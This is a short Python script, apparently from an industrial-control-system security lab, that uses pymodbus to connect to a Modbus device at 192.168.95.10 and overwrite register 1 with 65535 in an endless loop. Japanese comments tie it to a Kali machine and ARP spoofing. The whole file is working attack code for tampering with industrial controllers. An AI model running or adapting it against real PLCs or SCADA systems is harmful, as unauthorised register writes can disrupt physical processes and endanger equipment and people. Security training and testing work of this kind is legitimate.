from pymodbus.client import ModbusTcpClient

# Kali自身に送る（ARPスプーフィング中なら.10宛てでOK）
client10 = ModbusTcpClient('192.168.95.10')

try: 
    while True: 
        # 第一引数は書き込み先のレジスタ番号, 第二引数は書き込む値
        res = client10.write_register(1, 65535)
        print("10:", res)

# KeyboardInterruptは例外型の1つ, Exceptionの子ではない
except KeyboardInterrupt:
    client10.close()
